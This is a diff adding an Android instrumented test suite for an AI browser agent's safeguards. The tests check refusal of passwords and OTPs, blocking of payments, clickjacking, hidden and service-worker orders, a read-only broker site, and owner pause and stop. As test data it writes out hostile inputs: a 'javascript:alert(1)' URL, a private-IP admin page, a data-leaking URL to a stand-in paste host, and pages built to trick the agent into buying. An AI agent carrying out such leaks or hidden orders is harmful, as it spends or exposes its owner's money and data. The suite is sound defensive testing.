@@ -1,0 +1,195 @@
+package com.ronin.browser.agent
+
+import android.util.Log
+import androidx.test.core.app.ActivityScenario
+import androidx.test.ext.junit.runners.AndroidJUnit4
+import org.json.JSONArray
+import org.json.JSONObject
+import org.junit.After
+import org.junit.Assert.assertEquals
+import org.junit.Assert.assertTrue
+import org.junit.Before
+import org.junit.Test
+import org.junit.runner.RunWith
+
+/**
+ * The pilot's per-mechanism checks on a REAL WebView (emulators in CI, then the owner's phone + tablet through the
+ * laptop helper). Each test names the mechanism it proves: tap (dispatchTouchEvent), commit (InputConnection),
+ * editorinfo (native password check), guard (shouldInterceptRequest / shouldOverrideUrlLoading), sw (service worker
+ * hook), journal, owner. A failing mechanism must be switched off before the owner uses the agent.
+ */
+@RunWith(AndroidJUnit4::class)
+class AgentDeviceTest {
+    private lateinit var scenario: ActivityScenario<AgentActivity>
+    private lateinit var d: AgentDriver
+    private var n = 0
+    private var snap = JSONObject()
+
+    @Before fun start() {
+        scenario = ActivityScenario.launch(AgentActivity::class.java)
+        var w = 0
+        while (AgentActivity.driver == null && w < 100) { Thread.sleep(100); w++ }
+        d = AgentActivity.driver ?: error("agent did not start")
+        d.testPages.clear(); d.testPages.putAll(AgentTestPages.all)
+        d.resume(); d.checked()
+    }
+
+    @After fun stop() { scenario.close() }
+
+    private fun tool(name: String, vararg kv: Pair<String, Any>): JSONObject {
+        val a = JSONObject(); for ((k, v) in kv) a.put(k, v)
+        val r = d.run("t${System.nanoTime()}-${n++}", name, a)
+        Log.i("RoninAgent", "TEST $name -> ${r.toString().take(160)}")
+        return r
+    }
+
+    private fun open(url: String): JSONObject { val r = tool("open", "url" to url); snap = tool("snapshot"); return r }
+
+    private fun ref(re: String): String {
+        val els: JSONArray = snap.optJSONArray("elements") ?: JSONArray()
+        val rx = Regex(re)
+        for (i in 0 until els.length()) { val l = els.getString(i); if (rx.containsMatchIn(l)) return Regex("\\[(e\\d+)]").find(l)!!.groupValues[1] }
+        error("no element like /$re/ in ${els.toString().take(400)}")
+    }
+
+    private fun page(expr: String) = d.pageValue(expr)
+    private fun mech(name: String, ok: Boolean) = Log.i("RoninAgent", "MECH $name ${if (ok) "PASS" else "FAIL"}")
+
+    @Test fun epdsFormIsFilledWithRealTapsAndTyping() {
+        open("https://epds.example.gov.in/")
+        assertTrue("ID numbers hidden", snap.optString("page_text_untrusted").contains("[aadhaar-like hidden]"))
+        val t = tool("type", "ref" to ref("Employee name"), "text" to "Ramesh Kumar")
+        mech("commit:${t.optString("method")}", t.optString("check") == "verified")
+        assertEquals("name typed and read back: $t", "verified", t.optString("check"))
+        val h = tool("type", "ref" to ref("Employee ID"), "text" to "UP12345")
+        assertEquals("$h", "verified", h.optString("check"))
+        val hi = tool("type", "ref" to ref("Mobile"), "text" to "9876543210")
+        assertEquals("$hi", "verified", hi.optString("check"))
+        val s = tool("select", "ref" to ref("select"), "option" to "Assistant Teacher")
+        assertTrue("$s", s.optString("done").contains("Assistant Teacher"))
+        val c = tool("click", "ref" to ref("button \"Save\""))
+        assertTrue("$c", c.has("done"))
+        Thread.sleep(500)
+        assertEquals("saved once", "1", page("window.saves"))
+        mech("tap", page("window.saves") == "1")
+        assertTrue(page("document.getElementById('ok').textContent")!!.contains("Ramesh Kumar / Assistant Teacher"))
+    }
+
+    @Test fun hindiNameIsTyped() {
+        open("https://epds.example.gov.in/")
+        val t = tool("type", "ref" to ref("Employee name"), "text" to "रमेश कुमार")
+        mech("hindi:${t.optString("method")}", t.optString("check") == "verified")
+        assertEquals("$t", "verified", t.optString("check"))
+    }
+
+    @Test fun passwordsOtpsAndPinsAreNeverTyped() {
+        open("https://verify.example.in/")
+        assertTrue(tool("type", "ref" to ref("Portal password"), "text" to "x").optString("error").contains("password"))
+        assertTrue(tool("type", "ref" to ref("Enter code"), "text" to "123456").optString("error").contains("OTP"))
+        assertTrue(tool("type", "ref" to ref("Digit 1"), "text" to "4").optString("error").contains("OTP"))
+        assertTrue(tool("type", "ref" to ref("Remarks\""), "text" to "48 29-13").optString("error").contains("looks like an OTP"))
+        val ok = tool("type", "ref" to ref("Remarks2"), "text" to "Checked on site")
+        assertEquals("$ok", "verified", ok.optString("check"))
+    }
+
+    @Test fun nativePasswordCheckSeesThePasswordBox() {
+        // the native check alone (outside the page's JavaScript): tap the password box and read what the engine told the keyboard
+        open("https://verify.example.in/")
+        val before = d.web.lastInputAt
+        tool("click", "ref" to ref("Portal password"))
+        var w = 0; while (d.web.lastInputAt <= before && w < 30) { Thread.sleep(100); w++ }
+        val seen = d.web.lastInputAt > before
+        val secret = seen && AgentRules.secretInputType(d.web.lastInputType)
+        mech("editorinfo", secret)
+        Log.i("RoninAgent", "MECH editorinfo-seen $seen type=${d.web.lastInputType}")
+        assertTrue("EditorInfo arrived after the tap", seen)
+        assertTrue("EditorInfo says password (type ${d.web.lastInputType})", secret)
+    }
+
+    @Test fun moneyPagesAndHiddenOrdersAreStopped() {
+        open("https://fees.example.in/")
+        assertTrue(tool("click", "ref" to ref("भुगतान")).optString("error").contains("money"))
+        open("https://shop.example.com/")
+        assertTrue("clickjacking", tool("click", "ref" to ref("Cancel order")).optString("error").contains("covers"))
+        open("https://renew.example.com/")
+        val c = tool("click", "ref" to ref("Continue"))
+        Thread.sleep(800)
+        mech("guard-fetch", c.optString("error").contains("BLOCKED") && page("window.paid") != "1")
+        assertTrue("hidden fetch POST placeOrder blocked: $c", c.optString("error").contains("BLOCKED"))
+        assertTrue(page("window.paid") != "1")
+        val b0 = d.blocked.size
+        tool("click", "ref" to ref("Later"))
+        Thread.sleep(3800)
+        mech("guard-timer", d.blocked.size > b0 && page("window.paid2") != "1")
+        assertTrue("an order 3 s after the tap is blocked too", d.blocked.size > b0 && page("window.paid2") != "1")
+        open("https://renew.example.com/")
+        val l = tool("click", "ref" to ref("Next step"))
+        mech("guard-navigation", l.optString("error").contains("BLOCKED"))
+        assertTrue("/order?confirm=1 link: $l", l.optString("error").contains("BLOCKED"))
+        open("https://renew.example.com/")
+        tool("click", "ref" to ref("Save note")); Thread.sleep(800)
+        assertEquals("an ordinary POST still works", "1", page("window.noted"))
+    }
+
+    @Test fun serviceWorkerOrderIsBlocked() {
+        open("https://worker.example.com/")
+        val b0 = d.blocked.size
+        tool("click", "ref" to ref("Start worker"))
+        Thread.sleep(4000)
+        val ok = d.blocked.drop(b0).any { it.contains("placeOrder") }
+        Log.i("RoninAgent", "MECH sw-registered ${page("window.swok")} err=${page("window.swerr")}")
+        mech("sw", ok || page("window.swok") != "1")
+        if (page("window.swok") == "1") assertTrue("a worker's POST placeOrder is blocked", ok)
+    }
+
+    @Test fun brokerIsReadOnlyAndOnlyListedPagesOpen() {
+        open("https://web.dhan.co/")
+        assertTrue(tool("type", "ref" to ref("Mobile"), "text" to "1100").optString("error").contains("READ-ONLY"))
+        assertTrue(tool("click", "ref" to ref("Login")).optString("error").contains("READ-ONLY"))
+        assertTrue(tool("open", "url" to "https://web.dhan.co/order").optString("error").contains("read pages"))
+        d.readPages["web.dhan.co"] = mutableSetOf("/positions")
+        open("https://web.dhan.co/positions")
+        assertTrue(snap.optString("page_text_untrusted").contains("P&L +1,240"))
+        assertTrue(tool("click", "ref" to ref("Exit All")).optString("error").contains("READ-ONLY"))
+    }
+
+    @Test fun linksAddressesAndHumanChecks() {
+        open("https://news.example.com/")
+        assertTrue(tool("click", "ref" to ref("Read more")).optString("error").contains("script link"))
+        assertTrue(tool("open", "url" to "http://192.168.1.1/admin").optString("error").contains("never opened"))
+        assertTrue(tool("open", "url" to "javascript:alert(1)").optString("error").contains("not allowed"))
+        open("https://protected.example.org/")
+        assertTrue(tool("click", "ref" to ref("Verify you are human")).optString("error").contains("human check"))
+        open("https://liar.example.com/")
+        assertTrue("a page that lies to the helper still shows Pay now as money", snap.optJSONArray("elements").toString().contains("Pay now"))
+    }
+
+    @Test fun dataDoesNotLeaveAfterReadingSensitivePages() {
+        open("https://bank.example.in/")
+        assertTrue(snap.optString("page_text_untrusted").contains("[PAN hidden]"))
+        val r = tool("open", "url" to "https://paste.example.net/?d=" + "A".repeat(60))
+        assertTrue("$r", r.optString("error").contains("sensitive"))
+        assertTrue(tool("screenshot").optString("error").contains("refused"))
+    }
+
+    @Test fun ownerTouchPausesUntilResumeAndStopHolds() {
+        open("https://news.example.com/")
+        d.paused = true // what a real touch does (onOwnerTouch)
+        assertTrue(tool("snapshot").optString("error").contains("RESUME"))
+        d.resume()
+        assertTrue(!tool("snapshot").has("error"))
+        d.ownerStop()
+        assertTrue(tool("snapshot").optString("error").contains("STOP"))
+        d.resume()
+        mech("owner", true)
+    }
+
+    @Test fun interruptedSaveIsNeverPressedAgain() {
+        open("https://epds.example.gov.in/")
+        val prefs = androidx.test.platform.app.InstrumentationRegistry.getInstrumentation().targetContext.getSharedPreferences("agent-journal", 0)
+        prefs.edit().putString("j_crash1", "started").putString("lastTarget", "click|epds.example.gov.in|button|Save||").commit()
+        val r = d.run("crash1", "click", JSONObject().put("ref", ref("button \"Save\"")))
+        assertTrue("$r", r.has("uncertain"))
+        mech("journal", r.has("uncertain"))
+    }
+}
